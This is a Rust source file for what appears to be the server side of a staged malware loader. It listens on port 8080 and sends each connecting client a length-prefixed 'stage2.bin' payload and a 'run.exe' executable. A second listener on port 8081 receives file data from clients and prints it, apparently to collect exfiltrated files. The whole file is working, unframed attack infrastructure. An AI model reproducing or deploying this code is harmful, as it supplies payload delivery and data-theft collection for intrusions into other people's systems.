use std::{
    io::{Read, Write},
    net::TcpListener,
    path::PathBuf,
    time::Duration,
};

use clap::{command, Parser};
use log::{error, info, warn};
use simple_logger::SimpleLogger;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// Path to the stage2.bin to deliver
    #[arg(short, long)]
    stage2: PathBuf,

    /// Path to the run.exe to deliver
    #[arg(short, long)]
    run: PathBuf,
}

fn start_file_listener() {
    let listener = TcpListener::bind("0.0.0.0:8081").unwrap();
    info!("File listener listening...");

    for stream in listener.incoming() {
        info!("File listener connection established!");

        let mut stream = stream.unwrap();
        let mut file_data = String::new();
        let _ = stream.read_to_string(&mut file_data);

        println!("{}", file_data);

        info!("Waiting for new file connection...")
    }
}

fn main() -> std::io::Result<()> {
    SimpleLogger::new().init().unwrap();

    let args = Args::parse();

    if !args.stage2.exists() {
        warn!("[WARN] Provided stage2 does not exist: {:?}", &args.stage2);
    }

    if !args.run.exists() {
        warn!("[WARN] Provided run.exe does not exist: {:?}", &args.run);
    }

    std::thread::spawn(start_file_listener);

    let listener = TcpListener::bind("0.0.0.0:8080").unwrap();
    info!("Server listening...");

    for stream in listener.incoming() {
        info!("Connection established!");

        let stage2 = std::fs::read(&args.stage2)?;
        let run = std::fs::read(&args.run)?;
        let mut stream = stream.unwrap();

        info!("Sending stage1 len");
        stream.write_all(&(stage2.len() as u32).to_be_bytes())?;
        info!("Sending stage1");
        stream.write_all(&stage2)?;

        info!("Sending run.exe len");
        stream.write_all(&(run.len() as u32).to_be_bytes())?;
        info!("Sending run.exe");
        stream.write_all(&run)?;

        info!("Waiting for new connection...")
    }

    Ok(())
}
